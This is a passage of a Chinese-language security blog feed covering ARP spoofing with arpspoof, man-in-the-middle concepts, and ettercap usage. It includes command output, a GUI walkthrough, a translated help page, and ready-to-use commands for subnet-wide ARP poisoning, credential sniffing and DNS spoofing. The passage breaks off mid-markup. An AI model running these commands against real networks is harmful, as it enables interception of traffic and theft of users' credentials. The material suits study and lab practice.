class="code"><pre><span class="line">root@Kali:~# arpspoof -i eth0 -t 192.168.2.253  192.168.2.1</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br></pre></td></tr></table></figure><p>攻击者(192.168.2.51) 向目标主机 (192.168.2.253)发送数据包。 其中 <code>0:c:29:3:7d:7d</code> 是攻击者MAC地址，<code>64:0:6a:47:15:be</code> 是目标主机的MAC地址。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br></pre></td></tr></table></figure><p> 当收到显示时， 目标主机 向网关发送数据，都将发送到攻击者192.168.6.102 上。</p><p>​</p></li><li><p>Arpspoof 注入攻击网关。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# arpspoof -i eth0 -t 192.168.2.1  192.168.2.253</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br></pre></td></tr></table></figure><p>以上输出信息显示了攻击者向网关192.168.2.1发送的数据包。当该攻击成功后，网关192.168.2.1发给目标系统192.168.2.253上的信息发送到攻击者主机192.168.2.51上。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br></pre></td></tr></table></figure><p>​</p></li><li><p>以上步骤都执行成功后，攻击者就相当于控制了网关与目标主机双向传输的数据。攻击者可以通过收到的数据，查看到目标系统上重要的信息。</p><p>​</p><p>​</p></li></ol><h4 id="完整分析过程"><a href="#完整分析过程" class="headerlink" title="完整分析过程"></a>完整分析过程</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# arpspoof -i eth0 -t 192.168.2.253  192.168.2.1</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 64:0:6a:47:15:be 0806 42: arp reply 192.168.2.1 is-at 0:c:29:3:7d:7d</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">root@Kali:~# arpspoof -i eth0 -t 192.168.2.1  192.168.2.253</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br><span class="line">0:c:29:3:7d:7d 50:da:0:7f:61:19 0806 42: arp reply 192.168.2.253 is-at 0:c:29:3:7d:7d</span><br></pre></td></tr></table></figure><p><img src="/img/kali/arpspoof/icmp_完整信息.png" alt=""></p><ol><li>目标主机 发送 icmp 请求到网关， 但实际映射到 51攻击主机。</li><li>攻击主机即192.168.2.51 将 192.168.2.253 的icmp数据包进行转发</li><li>经过转发后，51攻击主机(欺骗) 发送icmp请求包到达 192.168.2.1 网关</li><li>网关 192.168.2.1 回复icmp请求包到 192.168.2.253 (这台实际为攻击主机即51)</li><li>51攻击主机 转发 网关icmp应答包</li><li>51攻击主机(模拟) 网关发送icmp应答包到达  192.168.2.253目的主机</li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Linux </tag>
            
            <tag> Commands </tag>
            
            <tag> 渗透 </tag>
            
            <tag> Kali </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>中间人攻击</title>
      <link href="/2018/04/02/kali/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/"/>
      <url>/2018/04/02/kali/%E4%B8%AD%E9%97%B4%E4%BA%BA%E6%94%BB%E5%87%BB/</url>
      
        <content type="html"><![CDATA[<h2 id="什么是“中间人攻击”？"><a href="#什么是“中间人攻击”？" class="headerlink" title="什么是“中间人攻击”？"></a>什么是“中间人攻击”？</h2><blockquote><p>​    中间人攻击（Man-in-the-Middle Attack，简称“MiTM攻击”）是一种“间接”的入侵攻击，这种攻击模式是通过各种技术手段将受入侵者控制的一台计算机虚拟放置在网络连接中的两台通信计算机之间，这台计算机就称为“中间人”。入侵者把这台计算机模拟一台或两台原始计算机，使“中间人”能够与原始计算机建立活动连接并允许其读取或篡改传递的信息，然而两个原始计算机用户却认为他们是在互相通信，因而这种攻击方式并不很容易被发现。所以中间人攻击很早就成为了黑客常用的一种古老的攻击手段，并且一直到今天还具有极大的扩展空间。</p></blockquote><a id="more"></a><p><br></p><h3 id="中间人攻击常见的两种方法：ARP欺骗、DNS欺骗。"><a href="#中间人攻击常见的两种方法：ARP欺骗、DNS欺骗。" class="headerlink" title="中间人攻击常见的两种方法：ARP欺骗、DNS欺骗。"></a>中间人攻击常见的两种方法：ARP欺骗、DNS欺骗。</h3><p><strong>ARP欺骗：</strong></p><blockquote><p>​    在实现TCP/IP协议的网络环境下，一个ip包走到哪里，要怎么走是靠路由表定义，但是，当ip包到达该网络后，哪台机器响应这个ip包却是靠该ip包中所包含的硬件mac地址来识别。也就是说，只有机器的硬件mac地址和该ip包中的硬件mac地址相同的机器才会应答这个ip包，因为在网络中，每一台主机都会有发送ip包的时候，所以，在每台主机的内存中，都有一个 arp–&gt; 硬件mac 的转换表。通常是动态的转换表（该arp表可以手工添加静态条目）。也就是说，该对应表会被主机在一定的时间间隔后刷新。这个时间间隔就是ARP高速缓存的超时时间。通常主机在发送一个ip包之前，它要到该转换表中寻找和ip包对应的硬件mac地址，如果没有找到，该主机就发送一个ARP广播包，于是，主机刷新自己的ARP缓存。然后发出该ip包。在此推荐FB上的一篇文章: <a href="http://www.freebuf.com/articles/system/5157.html" target="_blank" rel="noopener">中间人攻击-ARP毒化</a></p></blockquote><p><strong>常用软件：</strong></p><ul><li>ARPspoof</li><li>Cain&amp;abel</li><li>Ettercap</li><li>ARPoison</li><li>Dsniff</li><li>Parasite</li></ul><p><strong>DNS欺骗：</strong> </p><blockquote><p>​    目标将其DNS请求发送到攻击者这里，然后攻击者伪造DNS响应，将正确的IP地址替换为其他IP，之后你就登陆了这个攻击者指定的IP，而攻击者早就在这个IP中安排好了一个伪造的网站如某银行网站，从而骗取用户输入他们想得到的信息，如银行账号及密码等，这可以看作一种网络钓鱼攻击的一种方式。对于个人用户来说，要防范DNS劫持应该注意不点击不明的连接、不去来历不明的网站、不要在小网站进行网上交易，最重要的一点是记清你想去网站的域名，当然，你还可以把你常去的一些涉及到机密信息提交的网站的IP地址记下来，需要时直接输入IP地址登录。在此还推荐FB上的一篇文章: <a href="http://www.freebuf.com/articles/system/5265.html" target="_blank" rel="noopener">中间人攻击-DNS欺骗</a></p></blockquote><h3 id="ettercap"><a href="#ettercap" class="headerlink" title="ettercap"></a>ettercap</h3><p>​    PS：其实Linux下实施ARP攻击的软件不只有ettercap，也可以使用arpspoof，arpspoof比较简洁，参数也少，非常易用…不过要配合iptables来转发流量，不然目标会断网，ettercap自带转发功能，功能也比较全面因此使用比较多。    </p><p>Ettercap支持对许多协议（包括加密协议）的主动和被动分离，并具有网络和主机分析方面的多项功能。Ettercap包含四种操作模式：</p><blockquote><p>基于IP的模式：根据IP源和目的地过滤数据包</p><p>基于MAC的模式：根据MAC地址过滤数据包，该模式能够对嗅探通过网关的连接起到作用。</p><p>基于ARP的模式：利用ARP欺骗方式在两个主机之间的交换式局域网（全双工，即支持双方同时发送信息）上进行嗅探。</p><p>基于公共ARP的模式：利用ARP欺骗方式从一台受害者主机到其它所有主机的交换式局域网（全双工）上进行嗅探。</p></blockquote><h4 id="具体功能："><a href="#具体功能：" class="headerlink" title="具体功能："></a>具体功能：</h4><blockquote><p>在已建立的连接中注入字符：将字符注入到服务器（模拟命令）或客户端（模拟回复），同时保持实时连接。</p><p>SSH1支持：嗅探用户名和密码，甚至是SSH1连接的数据。Ettercap是第一个能够以全双工方式嗅探SSH连接的软件。</p><p>HTTPS支持：嗅探HTTP SSL连接上的加密数据——通过Cisco路由器的GRE tunnel对远程流量进行嗅探，并对它进行”中间人攻击”。</p><p>插件支持：使用Ettercap的API创建自定义插件。</p><p>密码收集：可以收集以下协议的密码信息——TELNET、FTP、POP、IMAP、rlogin、SSH1、ICQ、SMB、MySQL、HTTP、NNTP、X11、Napster、IRC、RIP、BGP、SOCKS 5、IMAP 4、VNC、LDAP、NFS、SNMP、Half-Life、Quake 3MSN、YMSG</p><p>数据包过滤/丢弃：设置一个过滤器，用于在TCP或UDP有效内容中查找特定字符串（或十六进制序列），并用自定义字符串/序列替换它，或丢弃整个数据包。</p><p>操作系统指纹：可以提取受害主机及其网络适配器的操作系统信息。</p><p>终止连接：从connections-list（连接列表）中终止所选择的连接。</p><p>局域网的被动扫描：检索局域网上的主机信息、开放端口、可用服务的版本号、主机（网关、路由器或简单PC）的类型以及跃点数（跃点即路由，一个路由为一个跃点。传输过程中需要经过多个网络，每个被经过的网络设备点（有能力路由的）叫做一个跃点，地址就是它的ip。跃点数是经过了多少个跃点的累加器，为了防止无用的数据包在网上流散。 ）的预估距离。</p><p>劫持DNS请求。</p><p>Ettercap还具有主动或被动地在局域网中找到其它受感染者的功能。</p></blockquote><h3 id="ettercap-图形界面演示"><a href="#ettercap-图形界面演示" class="headerlink" title="ettercap 图形界面演示"></a>ettercap 图形界面演示</h3><ol><li><p>在终端输入 <code>ettercap -G</code>  用于启动图形化界面 ， 并查看本机IP 与 MAC地址</p><p><img src="/img/kali/ettercap/ettercap_open.png" alt=""></p><p><img src="/img/kali/ettercap/kali_info.png" alt=""></p><p>​</p></li><li><p>进行网卡嗅探  <code>Sniff  -&gt;  Unified sniffing -&gt;  选择网卡  -&gt; ok</code></p><p><img src="/img/kali/ettercap/sniff.png" alt=""></p><p>​</p></li><li><p>进行目标IP选取  <code>Host -&gt;  hosts list / 若足够ip 选择 scan for host</code>    将攻击主机IP设置为TARGET1 ， 网关设置为TARGET2;   然后进行 <code>sniff 嗅探</code></p><p><img src="/img/kali/ettercap/arp_sucess.png" alt=""></p><p><img src="/img/kali/ettercap/mitm_attack_arp.png" alt=""></p><p>​</p></li><li><p>可以查看目标主机， 发现已经毒化成功</p><p><img src="/img/kali/ettercap/arp_毒化.png" alt=""></p></li><li><p><code>start -&gt; start sniffing</code> 此时，目标主机的所有流量都将会通过本机(Kali)网卡，可以截取任意数据包。<img src="/img/kali/ettercap/get_data.png" alt=""></p></li></ol><h3 id="ettercap-命令行"><a href="#ettercap-命令行" class="headerlink" title="ettercap 命令行"></a>ettercap 命令行</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br></pre></td><td class="code"><pre><span class="line">用法: ettercap [选项] [目标1] [目标2]  </span><br><span class="line">  </span><br><span class="line">目标写法：(可以查看 man ettercap 获取更详细信息)  </span><br><span class="line">目标写法格式是：  MAC/IPs/PORTs   。依照这个规则，我们把目标可以精确到特定的主机和端口上。MAC、IP、和PORT为三个条件，为空代表ANY。  </span><br><span class="line">"//80"即表示对任意MAC、任意IP上的80端口进行嗅探。一般来说，MAC部分留空，除非你愿意去手动输入那一长串的MAC地址。因此，我们可以只用IP部分来确定目标主机。  </span><br><span class="line">  </span><br><span class="line">注意：如果 IPv6 启用，目标是 MAC/IPs/IPv6/PORTs 这种形式。 即 mac地址，ip地址，端口号中间用 "/" 符号隔开，留空不写表示 “ANY”，即所有。  </span><br><span class="line">  </span><br><span class="line">当IP有多个的时候，可以用英文","分隔不同的C段ip。可以用"-"表示连续的ip。可以用";"分隔不同表达形式的ip。  </span><br><span class="line">举例如下："10.0.0.1-5;10.0.1.33" 表示 ip 10.0.0.1, 2, 3, 4, 5 和 10.0.1.33  </span><br><span class="line">端口部分也有类似的写法，看例子："20-25,80,110" 表示 20, 21, 22, 23, 24, 25, 80 和 110  </span><br><span class="line">  </span><br><span class="line">例如:   </span><br><span class="line">      /192.168.1.1/                  表示 192.168.1.1 的所有端口号  </span><br><span class="line">      aa:bb:cc:dd:ee:ff//80          表示 aa:bb:cc:dd:ee:ff 的80端口.       </span><br><span class="line">        </span><br><span class="line">      其中多个mac地址用英文符号分号 ';' 隔开。  </span><br><span class="line">      多个ip地址和端口号可以用符号 '-' 表示连续 和 英文符号分号 ';' 隔开；  </span><br><span class="line">       e.g.  </span><br><span class="line">       "10.0.0.1-5;10.0.1.33"                    表示 10.0.0.1, 2, 3, 4, 5 和 10.0.1.33        </span><br><span class="line">       "20-25,80,110"                            表示 20, 21, 22, 23, 24, 25, 80 和 110  </span><br><span class="line">       /192.168.1.100-120;192.168.2.130/         表示 /192.168.1.100,101,102,103,～～120;192.168.12.130/   </span><br><span class="line">        </span><br><span class="line">      这两个目标是为了过滤从一个到另一个之间的流量，反之亦然(因为连接是双向的)。  </span><br><span class="line">       "//80"                                    表示任意MAC地址，任意 IP ,但是端口是80 的目标。  </span><br><span class="line">       "/10.0.0.1/"                              表示任意 MAC地址，IP是10.0.0.1，任意端口 的 目标      </span><br><span class="line">       "//"                                      表示 "子网中所有主机"。  </span><br><span class="line">  </span><br><span class="line">      注意:  </span><br><span class="line">            可以在命令行用 -R 选项 反向 匹配 目标. So if you want to sniff  </span><br><span class="line">            如果要嗅探除了10.0.0.1目标的所有进出流量。可以这样写："./ettercap -R /10.0.0.1/"  </span><br><span class="line">  </span><br><span class="line">      注意:  </span><br><span class="line">           目标也就是对局域网初始扫描扫描的主机。你可以通过netmask来限制只扫描网络中的一部分主机。  </span><br><span class="line">           结果是扫描两部分目标后后并的结果。还记得没有指定目标就意味着“没有目标”，但是指定“//”意味着“子网中的所有主机”。  </span><br><span class="line">  </span><br><span class="line">嗅探 和 攻击 选项:  </span><br><span class="line">  -M, --mitm &lt;method:args&gt;    中间人攻击，即两台终端间进行欺骗。(后面跟的参数可以参看 man ettercap)  </span><br><span class="line">  -o, --only-mitm             不嗅探，只执行中间人攻击  </span><br><span class="line">  -b, --broadcast             嗅探广播数据包  </span><br><span class="line">  -B, --bridge &lt;IFACE&gt;        使用桥接嗅探 (需要2个网络接口)。即 双网卡之间进行欺骗  </span><br><span class="line">  -p, --nopromisc             不把网络接口设置成混杂模式  </span><br><span class="line">  -S, --nosslmitm             不伪造SSL证书。即不使用ssl中间人攻击  </span><br><span class="line">  -u, --unoffensive           不转发数据包  </span><br><span class="line">  -r, --read &lt;file&gt;           从 pcapfile &lt;file&gt; 读取数据  </span><br><span class="line">  -f, --pcapfilter &lt;string&gt;   set the pcap filter &lt;string&gt;  </span><br><span class="line">  -R, --reversed              反转目标匹配。(即 匹配所有和目标不匹配的)  </span><br><span class="line">  -t, --proto &lt;proto&gt;         设置要嗅探的协议(默认嗅探所有)  </span><br><span class="line">      --certificate &lt;file&gt;    ssl中间人攻击使用指定的 证书文件   </span><br><span class="line">      --private-key &lt;file&gt;    ssl中间人攻击使用指定的 私钥文件   </span><br><span class="line">  </span><br><span class="line">运行界面类型:  </span><br><span class="line">  -T, --text                  文本模式显示   </span><br><span class="line">       -q, --quiet            安静模式，不显示嗅探数据   </span><br><span class="line">       -s, --script &lt;CMD&gt;     加载脚本   </span><br><span class="line">  -C, --curses                curses-UI模式   </span><br><span class="line">  -D, --daemon                守护模式(后台模式)(no GUI)  </span><br><span class="line">  -G, --gtk                   GTK-UI模式   </span><br><span class="line">  </span><br><span class="line">日志记录选项:  </span><br><span class="line">  -w, --write &lt;file&gt;          把嗅探到的数据写入到 pcapfile &lt;file&gt;  </span><br><span class="line">  -L, --log &lt;logfile&gt;         把所有数据包保存&lt;logfile&gt;日志文件中   </span><br><span class="line">  -l, --log-info &lt;logfile&gt;    仅仅记录被动信息到这个&lt;logfile&gt;日志文件中  </span><br><span class="line">  -m, --log-msg &lt;logfile&gt;     将所有的消息记录到这个&lt;logfile&gt;日志中。  </span><br><span class="line">  -c, --compress              使用gzip压缩日志文件  </span><br><span class="line">  </span><br><span class="line">可视化选项:  </span><br><span class="line">  -d, --dns                   把IP地址解析成主机名  </span><br><span class="line">  -V, --visual &lt;format&gt;       显示方式   </span><br><span class="line">  -e, --regex &lt;regex&gt;         使用一个正则表达式   </span><br><span class="line">  -E, --ext-headers           为每个pck打印扩展标题  </span><br><span class="line">  -Q, --superquiet            超级安静模式，啥信息都不显示，只保存   </span><br><span class="line">  </span><br><span class="line">LUA脚本 选项:  </span><br><span class="line">      --lua-script &lt;script1&gt;,[&lt;script2&gt;,...]     使用逗号分割lua脚本  </span><br><span class="line">      --lua-args n1=v1,[n2=v2,...]               使用逗号分割传给lua脚本的参数  </span><br><span class="line">  </span><br><span class="line">通用基本选项:  </span><br><span class="line">  -i, --iface &lt;iface&gt;         指定网络接口  </span><br><span class="line">  -I, --liface                显示所有网络接口  </span><br><span class="line">  -Y, --secondary &lt;ifaces&gt;    后备网卡  </span><br><span class="line">  -n, --netmask &lt;netmask&gt;     在网络接口上强制使用这个 &lt;netmask&gt; 网络掩码  </span><br><span class="line">  -A, --address &lt;address&gt;     ip地址，针对一网卡多ip的情况   </span><br><span class="line">  -P, --plugin &lt;plugin&gt;       载入插件  </span><br><span class="line">  -F, --filter &lt;file&gt;         载入过滤器文件 (content filter)  </span><br><span class="line">  -z, --silent                不进行arp毒化和主机扫描   </span><br><span class="line">  -6, --ip6scan               在链路上发送 ICMPv6 探测和发现 IPv6 节点  </span><br><span class="line">  -j, --load-hosts &lt;file&gt;     从文件中载入主机列表  </span><br><span class="line">  -k, --save-hosts &lt;file&gt;     保存主机列表到文件中  </span><br><span class="line">  -W, --wifi-key &lt;wkey&gt;       载入 WIFI 密码(wep或wpa)  </span><br><span class="line">  -a, --config &lt;config&gt;       载入并使用一个非默认配置文件  </span><br><span class="line">  </span><br><span class="line">标准选项:  </span><br><span class="line">  -v, --version               打印版本信息并退出  </span><br><span class="line">  -h, --help                  显示帮助信息</span><br></pre></td></tr></table></figure><h4 id="UNIFIED-运行模式"><a href="#UNIFIED-运行模式" class="headerlink" title="UNIFIED 运行模式"></a>UNIFIED 运行模式</h4><p>UNIFIED的方式是以中间人方式嗅探；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">UNIFIED方式是同时欺骗A和B，把原本要发给对方的数据包发送到第三者C上，然后由C再转发给目标。  </span><br><span class="line">这样C就充当了一个中间人的角色。因为数据包会通过C那里，所以C可以对数据包进行分析处理，导致了原本只属于A和B的信息泄露给了C。  </span><br><span class="line">UNIFIED方式将完成以上欺骗并对数据包分析。  </span><br><span class="line">Ettercap劫持的是A和B之间的通信，在Ettercap眼中，A和B的关系是对等的。</span><br></pre></td></tr></table></figure><h4 id="BRIDGED-运行模式"><a href="#BRIDGED-运行模式" class="headerlink" title="BRIDGED 运行模式"></a>BRIDGED 运行模式</h4><p>BRIDGED方式是在双网卡情况下，嗅探两块网卡之间的数据包；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">BRIDGED方式 有点像笔记本电脑上有两个网卡，一个有线网卡一个无线网卡。可以将有线网卡的internet连接共享给无线网卡，这样笔记本就变成了一个无线ap。  </span><br><span class="line">无线网卡产生的所有数据流量都将传送给有线网卡。BRIDGED方式ettercap嗅探的就是这两块网卡之间的数据包。</span><br></pre></td></tr></table></figure><p><strong>一般而言，我们会使用UNIFIED 方式。 其运行参数为<code>-M</code> (MITM的首字母)</strong></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">Ettercap，它相当于ARP病毒和密码嗅探界的瑞士军刀。通常在非互动模式中使用它，但是默认情况下它的交互界面非常友好，使用起来很方便。  </span><br><span class="line">如果我们的目标是网络上的所有主机，想要嗅探每个节点之间的所有传输，我们可以用下列命令： ettercap -T -q -M ARP // //  </span><br><span class="line">你应当谨慎的使用上面那段命令，因为如果把一个大网络中所有的传输都通过一台很慢的计算机的话，那么这很有可能使整个网络连接瘫痪。  </span><br><span class="line">可以找个替罪羊，来看看 Ip 地址为 192.168.1.1 的主机，我们可以使用如下命令：ettercap -T -q -M ARP /192.168.1.1/ //  </span><br><span class="line">如果192.168.1.1是网关，我们应该可以看到所有的输出传输。下面是这些命令行选项的功能：  </span><br><span class="line">-T    告诉Ettercap使用文字界面，我最喜欢这个选项，因为GUI模式太复杂了。  </span><br><span class="line">-q    让Ettercap安静些，换句话说就是少些冗长的文字报告。  </span><br><span class="line">-M    让Ettercap我们想要使用的MITM（人参与其中）方式，本例中是ARP病毒。</span><br></pre></td></tr></table></figure><h4 id="常用组合"><a href="#常用组合" class="headerlink" title="常用组合"></a>常用组合</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><span class="line">#arp毒化eth0所在的网段，安静模式文本显示  </span><br><span class="line">ettercap -Tqi eth0 -M ARP // //   </span><br><span class="line">  </span><br><span class="line">#监听10.0.0.1的ftp，ssh，telnet信息,并保存到本地  </span><br><span class="line">ettercap -Tzq /10.0.0.1/21,22,23  -w hack.pcap   </span><br><span class="line">  </span><br><span class="line">#对192.168.1.120进行dns欺骗，使用默认网卡eth0,文本模式安静显示   </span><br><span class="line">ettercap -Tq -P dns_spoof -M arp /192.168.1.120/ //     </span><br><span class="line">  </span><br><span class="line">#使用过滤并监听10.0.0.2在80端口的所有通信，安静模式文本显示，保存数据到本地     </span><br><span class="line">ettercap -Tqi eth0 -L sniffed_data -F filter.ef -M arp:remote /10.0.0.2/80 //       </span><br><span class="line">  </span><br><span class="line">在控制台模式下（-T）不使用混杂模式（-p），你只会看到自己的通信。  </span><br><span class="line">ettercap -Tp  </span><br><span class="line">  </span><br><span class="line">在控制台模式下(-T)，不使用ARP初始化（-z）,不显示数据包内容(-q安静模式)，但是会显示用户名和密码和其他消息。  </span><br><span class="line">ettercap -Tzq  </span><br><span class="line">  </span><br><span class="line">在控制台模式下（-T），加载主机列表（-j），对目标执行arp毒化中间人攻击（-M arp）  </span><br><span class="line">ettercap -T -j /tmp/victims -M arp /10.0.0.1-7/ /10.0.0.10-20/  </span><br><span class="line">  </span><br><span 